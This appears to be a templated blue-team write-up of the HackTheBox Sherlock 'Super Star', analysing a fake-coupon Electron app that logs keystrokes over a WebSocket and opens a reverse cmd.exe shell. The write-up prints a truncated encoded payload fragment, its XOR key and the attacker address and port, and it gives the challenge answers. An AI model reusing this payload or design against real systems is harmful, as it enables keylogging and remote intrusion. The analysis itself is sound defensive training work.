---
layout: page
title: "Sherlock: Super Star - Report"
permalink: /writeups/htb-sherlocks-blue-team-writeups/sherlock-20-super-star/report/
---

![Super Star cover](/assets/portfolio-assets/writeups/hackthebox-sherlocks/thumbs/sherlock-20-super-star.png)

# Super Star

## Overview

| Field | Value |
| --- | --- |
| Source PDF | `SuperStar.pdf` |
| Pages | 9 |
| Difficulty | Easy |
| Prepared by | iamroot |
| Author | (s): iamroot |

## Scenario Summary

StoreD Technologies' customer support team operates tirelessly around the clock in 24/7 shifts to
meet customer needs. During the Diwali season, employees have been receiving genuine discount
coupons as part of the celebrations. However, this also presented an opportunity for a threat
actor to distribute fake discount coupons via email to infiltrate the organization's network.
One of the employees received a suspicious email, triggering alerts for enumeration activities
following a potential compromise. The malicious activity was traced back to an unusual process.
The Incident Response Team has extracted the malicious binaries and forwarded them to the
reverse engineering team for further analysis.
Artefacts Provided
Windows Binary
PCAP
Analysis

## Investigation Objective

Identify the activity described in the scenario, analyze the provided artifacts, answer the investigation questions, and document evidence in a repeatable Blue Team report format.

## Evidence Provided

Source PDF: `SuperStar.pdf`. Add downloaded challenge artifacts and hashes here when available.

## Tools Used

| Tool | Purpose |
| --- | --- |
| Wireshark | Used or likely relevant based on the source writeup |
| AWS CLI / CloudTrail | Used or likely relevant based on the source writeup |
| jq | Used or likely relevant based on the source writeup |

## Investigation Process

### Question 1: What is the process name of malicious NodeJS application?
- Analysis note: From the artifcats provide for the analysis we see that there's an EXE file called 'Electron-
Coupon.exe'. Looking at the file name it resembles like a package built using the 'electron-builder'.
Extracting the EXE package drops following files:
Upon extracting 'app-64.7z', it becomes clear that the process 'Coupon.exe' is responsible for
running the malicious Electron application.
- Answer: `Coupon.exe`
### Question 2: Which option has the attacker enabled in the script to run the malicious Node.js application?
- Analysis note: The 'app.asar' file, located inside the 'resource' folder of the 'app-64.7z' package, contains multiple
bundled files. We will extract it using the following command:
npx @electron/asar extract app.asar
The above command extracts all the files into the 'test' folder, and its contents are as follows:
By analyzing the 'index.json' file in a text editor, we found that the attacker has enabled
'nodeIntegration', allowing
- Answer: `nodeintegration`
### Question 3: What protocol and port number is the attacker using to transmit the victim's keystrokes?
- Analysis note: The 'index.js' file also reveals that the attacker is loading an HTML file named 'testPage.html':
The 'testPage.html' file further loads the 'keylogger.js' script, which captures the victim's
keystrokes and transmits them to the attacker over port '44500' via a 'WebSocket' connection.
- Answer: `websocket, 44500`
### Question 4: What XOR key is the attacker using to decode the encoded shellcode?
- Analysis note: The 'index.js' file also loads a preload script named 'preload.js'.
Analyzing the logic of this script reveals that the application retrieves the XOR key through an
HTTP GET request.
Since the traffic is HTTP, we will analyze all GET requests in the PCAP file. By expanding the 'Data'
section of the packet, we discover that the key used to decrypt the payload is 'ec1ee034ec1ee034'.
- Answer: `ec1ee034ec1ee034`
### Question 5: What is the IP address, port number and process name encoded in the attacker payload ?
- Analysis note: We decrypt the payload within the 'preload.js' file using the script below and find that the payload
has been modified to establish an interactive 'cmd.exe' session with '15.206.13.31' over port
'4444'.
key = 'ec1ee034ec1ee034'
var b64string =
"xHiVWo9qiVuCNslP4RTAFMw+llWePo5RmD7dFJ57kUGFbIUcznCFQM43zDnmPsAUzD7AFMx9kBTRPpJR
nWuJRok2wleEd4xQs26SW497k0fON8w55j7AFMw+wBTMbYgU0T6DRMJtkFWbcMgWj3OEGolmhRbAPrtpx
SXtPsw+wBSaf
- Answer: `15.206.13.31, 4444, cmd.exe`
### Question 6: What are the two commands the attacker executed after gaining the reverse shell?
- Analysis note: We already know that the attacker has established a reverse shell over port '4444'. With this in
mind, we will analyze all the traffic in the PCAP file and observe that the attacker executed
'whoami' and 'ipconfig' after successfully connecting.
- Answer: `whoami, ipconfig`
### Question 7: Which Node.js module and its associated function is the attacker using to execute the
shellcode within V8 Virtual Machine contexts?
- Analysis note: The 'preload.js' file loads the 'http', 'fs', and 'vm' modules, with the 'vm' module allowing
developers to execute code within V8 Virtual Machine contexts. In this instance, the attacker has
compiled the script using 'vm.Script' and executed it in a new context using the 'runInNewContext'
function.
- Answer: `vm, runInNewContext`
### Question 8: Decompile the bytecode file included in the package and identify the Win32 API used to
- Analysis note: execute the shellcode.
To decompile the compiled bytecode file (JSC), we will use a static analysis tool called 'View8' and
execute the following command to perform the decompilation:
Examining the logic of the decompiled file, we notice that a Win32 API called 'CreateThread' is
being used to execute the shellcode.
- Answer: `CreateThread`
### Question 9: Submit the fake discount coupon that the attacker intended to present to the victim.
- Analysis note: The shellcode within the bytecode file has been decompiled into 'Decimal' format.
Converting the decimal values back to ASCII reveals the coupon text that the attacker intended to
present to the victim, which precedes the word 'PWNED'.
- Answer: `COUPON1337`

## Key Findings

| Finding / Question | Answer / Evidence |
| --- | --- |
| What is the process name of malicious NodeJS application? | Coupon.exe |
| Which option has the attacker enabled in the script to run the malicious Node.js application? | nodeintegration |
| What protocol and port number is the attacker using to transmit the victim's keystrokes? | websocket, 44500 |
| What XOR key is the attacker using to decode the encoded shellcode? | ec1ee034ec1ee034 |
| What is the IP address, port number and process name encoded in the attacker payload ? | 15.206.13.31, 4444, cmd.exe |
| What are the two commands the attacker executed after gaining the reverse shell? | whoami, ipconfig |
| Which Node.js module and its associated function is the attacker using to execute the
shellcode within V8 Virtual Machine contexts? | vm, runInNewContext |
| Decompile the bytecode file included in the package and identify the Win32 API used to | CreateThread |
| Submit the fake discount coupon that the attacker intended to present to the victim. | COUPON1337 |

## Attack Timeline

See `timeline.md` for extracted timestamps and timeline notes.

## Indicators of Compromise

See `iocs.md` for extracted indicators and context.

## MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
| --- | --- | --- |
| Initial Access | Phishing: Spearphishing Attachment/Link | Observed in extracted case notes; validate with report evidence. |
| Execution | Command and Scripting Interpreter | Observed in extracted case notes; validate with report evidence. |
| Discovery | System / Network Discovery | Observed in extracted case notes; validate with report evidence. |
| Collection | Data from Local System / Cloud Storage | Observed in extracted case notes; validate with report evidence. |
| Defense Evasion | Obfuscated Files or Information | Observed in extracted case notes; validate with report evidence. |

## Impact Assessment

Assess affected users, hosts, accounts, data exposure, and operational risk after validating the evidence.

## Recommendations

- Preserve original artifacts and document hashes.
- Validate suspicious accounts, hosts, IP addresses, domains, and files.
- Add detections for the confirmed behaviors.
- Review access control and logging gaps found during the investigation.

## Lessons Learned

Add lessons learned after completing the investigation.

## Conclusion

This report was generated from the source PDF and should be reviewed while solving the Sherlock manually. Replace draft notes with your own investigation evidence before publishing.
